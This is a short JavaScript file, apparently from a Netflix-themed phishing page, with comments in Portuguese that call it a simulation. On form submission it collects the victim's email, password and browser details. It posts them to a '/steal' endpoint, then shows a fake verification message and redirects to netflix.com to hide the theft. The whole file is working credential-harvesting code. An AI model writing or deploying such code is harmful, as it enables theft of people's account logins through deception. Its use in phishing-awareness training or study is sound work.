document.getElementById('phishingForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const status = document.getElementById('status');
    
    // SIMULAÇÃO - Captura os dados
    const stolenData = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    console.log('🚨 DADOS CAPTURADOS (SIMULAÇÃO):', stolenData);
    
    fetch('/steal', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(stolenData)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Enviado ao servidor:', result);
        status.textContent = '✅ Verificação realizada com sucesso! Redirecionando...';
        status.className = 'status success';
        status.classList.remove('hidden');

        setTimeout(() => {
            window.location.href = 'https://www.netflix.com';
        }, 2000);
    })
    .catch(error => {
        console.error('Erro ao enviar:', error);
        status.textContent = '❌ Erro ao enviar dados. Tente novamente.';
        status.className = 'status error';
        status.classList.remove('hidden');
    });
});